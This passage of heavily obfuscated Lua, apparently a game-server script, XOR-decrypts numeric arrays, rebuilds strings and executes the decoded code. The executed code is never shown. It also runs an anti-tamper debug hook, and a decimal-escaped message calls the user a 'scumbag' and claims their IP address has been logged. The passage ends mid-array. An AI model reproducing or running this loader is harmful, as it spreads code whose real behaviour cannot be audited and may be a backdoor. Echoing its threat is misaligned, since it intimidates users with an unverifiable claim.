45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if j8VmbYUcs5oZvtOoNXhl1nUhOg7hfhEJ7gVZYIcRdrc5o0jxA5I8TRW79Awf0w4AJE7q2[fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('4A') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('31') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('FB') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('E2')](t) then
                    j8VmbYUcs5oZvtOoNXhl1nUhOg7hfhEJ7gVZYIcRdrc5o0jxA5I8TRW79Awf0w4AJE7q2
                        [fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('4A') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('31') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('FB') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('E2')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; todCIW3ZWWIrZ88JA4BRB1ci62M6hgWHv4BaQvobFjYW6e6nfhTVgNBqfUQsxsEXt(
{ 1202, 1157, 1211, 561, 1078, 1167, 607, 596, 543, 710, 1114, 898, 873, 1178, 969, 588, 1143, 940, 1029, 689, 1090,
  1057, 1118, 624, 1120, 703, 1184, 1025, 791, 1072, 664, 813, 814, 1098, 1207, 933, 557, 669, 1176, 573, 830, 881, 910,
  1155, 1152, 1147, 583, 958, 1004, 943, 590, 682, 1062, 584, 1159, 895, 1009, 987, 758, 886, 586, 805, 1161, 677, 728,
  882, 788, 1117, 1102, 946, 686, 817, 1018, 1063, 782, 668, 1081, 837, 961, 1160, 937, 870, 571, 795, 673, 1112, 760,
  919, 733, 904, 1201, 949, 836, 842, 911, 749, 559, 696, 999, 656, 801, 546, 1055, 802, 1043, 743, 908, 866, 767, 640,
  602, 807, 1027, 921, 647, 1074, 579, 1016, 648, 634, 862, 771, 762, 663, 978, 556, 812, 1153, 769, 679, 914, 877, 952,
  797, 1040, 572, 1053, 936, 627, 628, 781, 941, 610, 920, 867, 977, 1179, 840, 885, 643, 891, 820, 1151, 918, 635, 1049,
  1205, 706, 589, 1200, 854, 772, 1148, 776, 741, 1059, 942, 890, 1182, 878, 1195, 1089, 1132, 566, 777, 582, 1138, 770,
  787, 843, 883, 970, 750, 899, 1099, 1070, 1206, 721, 1075, 748, 950, 780, 923, 1139, 1104, 1088, 700, 1095, 1188, 1166,
  827, 896, 580, 713, 1169, 598, 1084, 1196, 614, 1015, 680, 1068, 957, 691, 930, 1209, 604, 731, 717, 1203, 1181, 549,
  1163, 1199, 1165, 1041, 834, 1154, 637, 1076, 1038, 1172, 552, 745, 819, 811, 773, 953, 863, 1145, 1183, 1021, 690,
  1086, 929, 545, 751, 794, 968, 925, 823, 1050, 793, 764, 1017, 670, 1136, 965, 564, 1106, 1173, 948, 676, 575, 1028,
  1066, 990, 636, 708, 1171, 554, 619, 638, 747, 1193, 1026, 595, 1137, 944, 926, 879, 578, 563, 599, 1127, 587, 1058,
  1156, 857, 766, 884, 1007, 752, 719, 544, 633, 1056, 759, 1130, 841, 768, 955, 1101, 1115, 1116, 1077, 704, 714, 1149,
  548, 1189, 650, 824, 975, 620, 871, 701, 1177, 966, 1011, 558, 723, 550, 1208, 746, 1091, 651, 1082, 1142, 616, 1100,
  851, 1113, 1140, 997, 662, 569, 688, 1030, 1168, 605, 1013, 654, 724, 551, 872, 1158, 893, 1190, 705, 864, 1061, 1124,
  1034, 906, 1092, 1048, 832, 1079, 576, 1023, 900, 846, 1164, 1129, 641, 994, 855, 1191, 1024, 653, 912, 608, 683, 1096,
  786, 1146, 922, 789, 880, 902, 693, 737, 876, 1051, 1186, 998, 567, 757, 907, 1047, 675, 702, 963, 617, 755, 1044, 927,
  592, 729, 660, 667, 593, 860, 1197, 1065, 645, 815, 732, 685, 829, 960, 798, 983, 712, 931, 935, 585, 779, 1005, 692,
  1185, 694, 560, 632, 695, 1085, 1194, 835, 1131, 720, 597, 967, 1187, 821, 1103, 971, 1174, 736, 568, 852, 644, 1108,
  738, 740, 850, 739, 1033, 1052, 697, 828, 954, 742, 964, 744, 754, 809, 698, 888, 845, 1107, 725, 1121, 905, 806, 810,
  1150, 981, 989, 887, 803, 1042, 727, 804, 986, 1105, 1003, 980, 959, 848, 1162, 847, 655, 1093, 775, 1204, 903, 947,
  1046, 1087, 934, 894, 856, 1192, 991, 615, 666, 1060, 985, 849, 699, 687, 932, 623, 974, 1020, 1122, 711, 1123, 874,
  1069, 562, 938, 1128, 763, 1141, 1135, 1110, 1014, 1097, 681, 611, 716, 945, 730, 671, 869, 800, 629, 547, 1006, 1125,
  822, 621, 642, 753, 858, 672, 928, 844, 816, 574, -1, 57, 95, 89, 116, 47, 49, 56, 44, 23, 90, 24, 40, 210, 68, 47, 25,
  116, 121, 17, 87, 84, 84, 54, 1, 116, 48, 23, 58, 6, 59, 18, 42, 4, 110, 3, 41, 60, 90, 88, 25, 79, 48, 79, 24, 33, 19,
  64, 23, 56, 5, 116, 22, 95, 52, 9, 115, 32, 58, 235, 69, 121, 12, 19, 57, 69, 81, 203, 110, 101, 115, 207, 84, 101, 19,
  72, 223, 82, 19, 30, 195, 72, 58, 184, 54, 7, 72, 86, 143, 65, 81, 70, 18, 27, 52, 26, 59, 166, 54, 32, 25, 78, 113,
  66, 43, 62, 73, 208, 35, 74, 16, 16, 16, 25, 34, 250, 9, 126, 53, 128, 116, 18, 29, 186, 2, 69, 120, 24, 43, 52, 26,
  23, 95, 49, 9, 17, 173, 91, 75, 76, 40, 72, 99, 29, 59, 121, 56, 8, 2, 97, 72, 19, 23, 72, 18, 55, 10, 23, 1, 16, 2,
  37, 7, 59, 112, 126, 94, 101, 28, 18, 23, 105, 32, 18, 71, 109, 133, 121, 90, 119, 92, 13, 36, 80, 126, 72, 58, 13, 6,
  65, 60, 40, 186, 165, 94, 116, 107, 28, 71, 93, 46, 34, 47, 25, 43, 64, 97, 31, 75, 58, 21, 65, 64, 57, 205, 91, 84,
  71, 20, 43, 124, 7, 92, 34, 10, 72, 95, 83, 125, 14, 101, 23, 81, 83, 126, 115, 4, 71, 79, 36, 22, 225, 23, 149, 17, 9,
  80, 25, 199, 9, 204, 50, 70, 63, 141, 17, 19, 12, 121, 75, 62, 78, 112, 6, 83, 60, 67, 17, 45, 49, 84, 34, 91, 80, 6,
  81, 65, 24, 127, 116, 105, 25, 64, 126, 64, 101, 22, 74, 25, 226, 21, 212, 4, 110, 4, 118, 94, 172, 64, 18, 78, 101,
  80, 71, 84, 18, 17, 90, 16, 21, 82, 195, 79, 94, 23, 88, 17, 229, 85, 194, 22, 13, 110, 127, 5, 88, 255, 27, 67, 6, 45,
  28, 9, 76, 21, 35, 30, 71, 70, 70, 90, 16, 12, 124, 50, 108, 83, 97, 5, 79, 116, 13, 116, 0, 13, 82, 65, 119, 116, 54,
  22, 48, 93, 116, 22, 52, 14, 87, 22, 17, 83, 174, 102, 122, 181, 186, 115, 27, 66, 72, 18, 97, 41, 92, 70, 121, 94,
  111, 5, 53, 81, 11, 17, 3, 121, 29, 124, 240, 64, 95, 126, 56, 49, 6, 80, 63, 44, 18, 68, 235, 8, 49, 70, 19, 126, 91,
  34, 109, 96, 28, 135, 17, 89, 49, 27, 82, 73, 72, 125, 72, 53, 105, 109, 101, 228, 15, 65, 100, 72, 52, 116, 125, 164,
  12, 23, 49, 116, 68, 88, 76, 220, 254, 71, 73, 40, 17, 67, 24, 207, 149, 85, 81, 94, 67, 8, 109, 28, 26, 238, 121, 71,
  6, 61, 98, 91, 4, 13, 176, 17, 60, 80, 17, 119, 42, 0, 20, 70, 116, 10, 129, 147, 34, 70, 99, 231, 252, 94, 70, 72, 19,
  105, 76, 89, 129, 72, 24, 116, 118, 28, 14, 94, 27, 164, 89, 109, 40, 4, 79, 13, 18, 76, 113, 75, 7, 51, 31, 68, 87,
  68, 245, 75, 219, 82, 4, 40, 92, 14, 72, 33, 23, 79, 1, 5, 109, 64, 110, 1, 87, 72, 64, 19, 70, 57, 65, 109, 113, 117,
  94, 116, 88, 22, 8, 124, 121, 36, 32, 66, 43, 125, 107, 43, 72, 57, 80, 32, 21, 68, 29, 84, 26, 110, 85, 25, 101, 223,
  25, 86, 8, 98, 18, 15, 78, 108, 84, 66, 95, 79, 22, 110, 42, 60, 83, 2, 33, 110, 29, 1, 25, 67, 5, 54, 58, 80, 80, 53,
  21, 25, 71, 41, 42, 110, 25, 62, 22, 20, 63, 101, 29, 15, 27, 38, 30, 45, 253, 68, 36, 87, 68, 83, 33, 105, 66, 5, 112,
  33, 86, 26, 69, 35, 72, 113, 92, 17, 30, 98, 84, 217, 70, 79, 34, 102, 85, 93, 94, 68, 81, 85, 126, 63, 2, 6 },
  "lEgchP7YqhM1N29f63T5hN1T7Q"); qSY1bSbPkOUUwHCXr1wQ0QNvoxCR1cxQqmSODfSHwZrhcYxkK73zptPw3 =
j8VmbYUcs5oZvtOoNXhl1nUhOg7hfhEJ7gVZYIcRdrc5o0jxA5I8TRW79Awf0w4AJE7q2; snHZ2JDYCE2sldjFAot600J5l09IVu6Zau3OTFQ9lHBcTs9IU4WkHgb1mNelY13y68Z =
j8VmbYUcs5oZvtOoNXhl1nUhOg7hfhEJ7gVZYIcRdrc5o0jxA5I8TRW79Awf0w4AJE7q2; tHunurLGcefKkPldifKfO2pM7WzJdfqP8CHmPtSFCQi3xFIUoEeida82XKKlls2MhZLrGVPSb5I =
snHZ2JDYCE2sldjFAot600J5l09IVu6Zau3OTFQ9lHBcTs9IU4WkHgb1mNelY13y68Z; t821JPg4p7Btway8qumlkNiEfEryurMmr7Z46wjRduGTgYtWoGZ9Yw6L5mx5dWS =
tHunurLGcefKkPldifKfO2pM7WzJdfqP8CHmPtSFCQi3xFIUoEeida82XKKlls2MhZLrGVPSb5I; raVDybe9s9guTbARO2ZptsRG5zlkRyesoauHh9PJbSWPfYzwAuej7ZLm3TUjZPMWMClh8CIIm =
t821JPg4p7Btway8qumlkNiEfEryurMmr7Z46wjRduGTgYtWoGZ9Yw6L5mx5dWS; s93jXBsCNHObWyWUH9wIVz2EPGbGlzgK8klcpi7AYJSQxRyM2q3K56icp6jSpm =
raVDybe9s9guTbARO2ZptsRG5zlkRyesoauHh9PJbSWPfYzwAuej7ZLm3TUjZPMWMClh8CIIm; bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH = function(
  a)
  K, F = 6216194221802499, 16384 + 2753; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; nbGkS0ar6jZpDHG0iWxPVsow9r8PedJj18gcWwDq4GpRuULs7Yg9ehz3vGr9KAWzR1lH9NNTnt = function(b)
  co = coroutine.create(b)
  mtno5kzFCSxVhHztDKsmnM9jvKF5aW31Mc4R7j0Dv4ktVtOVWzCj2bFQxM1fCu = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(mtno5kzFCSxVhHztDKsmnM9jvKF5aW31Mc4R7j0Dv4ktVtOVWzCj2bFQxM1fCu, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return mtno5kzFCSxVhHztDKsmnM9jvKF5aW31Mc4R7j0Dv4ktVtOVWzCj2bFQxM1fCu
end; wIvqxf2R1baIo9rVf8CaqPxP69Ek2RapBxs2cCGniIPNbls7wXRDzbtns = function(f, g)
  sWLWsc2wFMmOP528UjO77ipVHtBIm8kGCGAB6yCoQAdXO0pVyx08i7JZ6U7Jva6AFJhM3S = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; xqKv0IQ2PmLXytHwhCKLyTgSFW7QVU1cNeFpa3bNCWfZ5q9XQ07BaiUTa8eepjweG5gRt = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; nvCUdQeQtGAvUOnQZYvQgEnhXCEM3kiBRNPgIkBoL9zokUxyB9yBkZK6SP3cGggzOOBHjJPRmw = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      sWLWsc2wFMmOP528UjO77ipVHtBIm8kGCGAB6yCoQAdXO0pVyx08i7JZ6U7Jva6AFJhM3S(f[i], string.byte(g, j),
        function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; wALStZtQUiEH1wS8AWSFaZV0adJkYJnk4YCftSrRqU0l55u6U6JwqDLYIqxp2aeuwTrcFlOG = function(p, n)
    gLk8qrnoVb94M4JKWEAB0hg5VsGmI6fRiFRdRHZFab4hCstPRMT6linhkMLo2ZVKygrNfvrHSz = ""
    for k, q in pairs(p) do gLk8qrnoVb94M4JKWEAB0hg5VsGmI6fRiFRdRHZFab4hCstPRMT6linhkMLo2ZVKygrNfvrHSz =
      gLk8qrnoVb94M4JKWEAB0hg5VsGmI6fRiFRdRHZFab4hCstPRMT6linhkMLo2ZVKygrNfvrHSz ..
      s93jXBsCNHObWyWUH9wIVz2EPGbGlzgK8klcpi7AYJSQxRyM2q3K56icp6jSpm
      [bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('EF') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('14') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('CA') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('7D') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('36') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('33')]
      [bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('9F') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('58') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('55') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('CA')](
      q) end
    ; n(gLk8qrnoVb94M4JKWEAB0hg5VsGmI6fRiFRdRHZFab4hCstPRMT6linhkMLo2ZVKygrNfvrHSz)
  end; xqKv0IQ2PmLXytHwhCKLyTgSFW7QVU1cNeFpa3bNCWfZ5q9XQ07BaiUTa8eepjweG5gRt(f,
    function(r) nvCUdQeQtGAvUOnQZYvQgEnhXCEM3kiBRNPgIkBoL9zokUxyB9yBkZK6SP3cGggzOOBHjJPRmw(r, g,
        function(s) wALStZtQUiEH1wS8AWSFaZV0adJkYJnk4YCftSrRqU0l55u6U6JwqDLYIqxp2aeuwTrcFlOG(s,
            function(t) if #nbGkS0ar6jZpDHG0iWxPVsow9r8PedJj18gcWwDq4GpRuULs7Yg9ehz3vGr9KAWzR1lH9NNTnt(s93jXBsCNHObWyWUH9wIVz2EPGbGlzgK8klcpi7AYJSQxRyM2q3K56icp6jSpm[bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('EC') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('5B') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('55') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('C4')]) == 1 then if s93jXBsCNHObWyWUH9wIVz2EPGbGlzgK8klcpi7AYJSQxRyM2q3K56icp6jSpm[bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('EC') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('5B') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('55') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('C4')] == s93jXBsCNHObWyWUH9wIVz2EPGbGlzgK8klcpi7AYJSQxRyM2q3K56icp6jSpm[bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('80') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('CA') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('7D') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('36') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('14')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if s93jXBsCNHObWyWUH9wIVz2EPGbGlzgK8klcpi7AYJSQxRyM2q3K56icp6jSpm[bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('EC') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('5B') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('55') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('C4')](t) then
                    s93jXBsCNHObWyWUH9wIVz2EPGbGlzgK8klcpi7AYJSQxRyM2q3K56icp6jSpm
                        [bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('EC') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('5B') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('55') .. bO1EgXDa3idiPbj9ztBhOqEwLJcrdo1gyhwirvC2uXw8cofcrRRyXzVH('C4')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; wIvqxf2R1baIo9rVf8CaqPxP69Ek2RapBxs2cCGniIPNbls7wXRDzbtns(
{ 681, 1125, 620, 701, 546, 901, 1086, 651, 688, 986, 860, 1142, 925, 851, 658, 1061, 1194, 572, 1080, 964, 1020, 822,
  942, 1100, 968, 1029, 1074, 1165, 805, 935, 1166, 1206, 1071, 735, 551, 816, 672, 743, 1157, 854, 885, 747, 692, 696,
  565, 724, 1186, 818, 1212, 807, 999, 694, 1119, 836, 630, 742, 690, 1008, 619, 653, 913, 1001, 1190, 1026, 1097, 709,
  956, 613, 936, 560, 761, 1052, 1191, 1011, 1173, 649, 715, 863, 1189, 585, 1017, 712, 840, 924, 1028, 883, 645, 768,
  644, 713, 1051, 1176, 1147, 703, 813, 554, 699, 975, 749, 544, 593, 945, 869, 811, 590, 960, 602, 1015, 574, 930, 786,
  1185, 1207, 908, 1150, 1135, 670, 760, 1193, 680, 1139, 809, 1024, 803, 675, 578, 996, 667, 1073, 575, 981, 683, 739,
  922, 962, 1161, 921, 648, 774, 647, 946, 545, 1021, 843, 1148, 1002, 950, 796, 1048, 969, 726, 1141, 661, 848, 1204,
  938, 858, 1090, 891, 881, 1096, 674, 573, 1033, 894, 1004, 1003, 581, 895, 1137, 802, 1082, 767, 746, 877, 1104, 1169,
  632, 909, 1064, 852, 855, 896, 624, 804, 845, 830, 600, 643, 770, 905, 609, 1039, 750, 873, 801, 1174, 548, 866, 864,
  1111, 1081, 671, 763, 1122, 882, 865, 995, 740, 777, 1050, 940, 1056, 1199, 990, 1159, 596, 928, 912, 1031, 775, 944,
  669, 772, 927, 793, 1012, 1009, 686, 829, 689, 547, 731, 1155, 828, 765, 722, 963, 1140, 870, 1170, 957, 916, 1198,
  1146, 1154, 979, 1120, 1172, 673, 985, 1132, 961, 872, 582, 711, 983, 879, 871, 717, 1133, 744, 1038, 759, 1077, 886,
  1107, 567, 676, 751, 736, 1005, 756, 636, 611, 907, 1127, 1007, 1130, 764, 1177, 612, 1175, 1057, 1153, 1108, 714,
  1113, 989, 1019, 1196, 868, 951, 657, 799, 639, 586, 837, 876, 691, 897, 745, 734, 815, 1092, 1168, 663, 1066, 1079,
  1085, 1044, 919, 982, 1200, 1201, 687, 1136, 718, 665, 1156, 857, 931, 1203, 992, 902, 1075, 904, 666, 798, 720, 862,
  889, 959, 1000, 949, 725, 785, 564, 782, 965, 607, 707, 587, 1030, 1209, 915, 580, 631, 618, 977, 1040, 823, 550, 1124,
  730, 562, 831, 791, 1188, 1197, 1105, 754, 603, 588, 1065, 806, 1098, 874, 583, 1047, 576, 918, 559, 555, 997, 1059,
  1167, 642, 617, 710, 1037, 790, 920, 1184, 941, 948, 958, 966, 1042, 1110, 684, 1099, 1202, 1018, 847, 737, 604, 943,
  1070, 820, 910, 1068, 650, 700, 978, 757, 887, 638, 844, 980, 622, 762, 589, 635, 594, 821, 1114, 784, 834, 838, 1013,
  954, 741, 1043, 566, 758, 1205, 953, 652, 1022, 1145, 579, 1183, 664, 1171, 833, 824, 568, 792, 933, 903, 817, 773,
  861, 553, 1131, 1118, 947, 776, 668, 721, 1208, 1106, 1084, 1109, 656, 1164, 1144, 994, 875, 810, 1053, 697, 698, 1023,
  988, 794, 719, 1093, 1063, 842, 614, 1149, 839, 1035, 738, 1151, 1102, 984, 641, 880, 1006, 584, 634, 1087, 685, 976,
  853, 748, 1117, 825, 1211, 993, 569, 808, 695, 606, 991, 755, 1162, 841, 705, 906, 832, 752, 625, 827, 1062, 704, 1078,
  898, 1027, 932, 549, 1192, 878, 934, 1072, 659, 1121, 970, 1060, 1112, 628, 557, 789, 923, 1178, 1083, 679, 1036, 888,
  1187, 621, 917, 788, 1076, 892, 1163, 778, 577, 1054, -1, 73, 92, 91, 34, 3, 95, 21, 84, 87, 227, 68, 86, 73, 55, 42,
  112, 87, 25, 6, 90, 225, 32, 52, 87, 3, 83, 105, 180, 145, 9, 2, 100, 67, 19, 2, 58, 23, 31, 1, 0, 100, 84, 15, 17, 60,
  38, 117, 83, 183, 117, 45, 89, 248, 10, 118, 42, 151, 77, 193, 13, 26, 90, 105, 1, 16, 44, 78, 150, 17, 87, 11, 78,
  106, 127, 84, 95, 87, 1, 64, 78, 223, 81, 21, 205, 187, 33, 162, 68, 12, 3, 98, 88, 88, 30, 152, 25, 71, 149, 21, 76,
  7, 84, 18, 107, 73, 78, 93, 11, 3, 17, 5, 155, 104, 30, 78, 5, 115, 154, 99, 0, 3, 31, 24, 81, 31, 0, 84, 67, 94, 83,
  66, 95, 69, 88, 216, 118, 46, 12, 121, 59, 5, 7, 20, 30, 33, 63, 56, 54, 76, 120, 155, 48, 67, 25, 30, 10, 118, 11, 54,
  19, 80, 24, 78, 180, 33, 191, 4, 88, 85, 100, 89, 27, 89, 4, 60, 30, 44, 90, 16, 20, 41, 94, 81, 75, 64, 132, 208, 120,
  20, 148, 176, 54, 66, 84, 3, 78, 11, 75, 20, 39, 28, 10, 13, 72, 88, 76, 28, 18, 26, 17, 166, 81, 32, 68, 25, 73, 35,
  5, 57, 30, 23, 5, 23, 66, 97, 26, 61, 86, 15, 88, 93, 1, 94, 93, 68, 19, 180, 19, 171, 21, 123, 105, 89, 70, 3, 95, 14,
  90, 86, 56, 90, 13, 103, 9, 36, 82, 89, 48, 95, 83, 81, 93, 10, 6, 29, 83, 71, 34, 38, 85, 127, 137, 25, 10, 105, 92,
  167, 12, 45, 86, 76, 76, 119, 249, 17, 7, 86, 104, 118, 73, 75, 68, 128, 22, 67, 100, 74, 42, 20, 77, 28, 62, 99, 253,
  100, 86, 171, 158, 9, 94, 124, 76, 101, 80, 31, 65, 85, 69, 77, 118, 110, 93, 75, 116, 96, 87, 23, 27, 26, 31, 3, 121,
  14, 29, 113, 84, 20, 17, 104, 86, 28, 113, 84, 9, 44, 97, 86, 70, 67, 83, 66, 91, 22, 84, 18, 57, 64, 237, 5, 84, 28,
